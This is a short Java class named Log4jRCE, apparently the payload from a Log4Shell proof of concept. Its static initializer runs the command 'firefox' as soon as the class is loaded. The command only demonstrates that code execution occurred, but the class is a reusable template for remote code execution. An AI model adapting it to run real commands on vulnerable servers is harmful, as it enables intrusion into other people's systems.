public class Log4jRCE {

	static {
		try {
			Runtime.getRuntime().exec("firefox").waitFor();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}
}
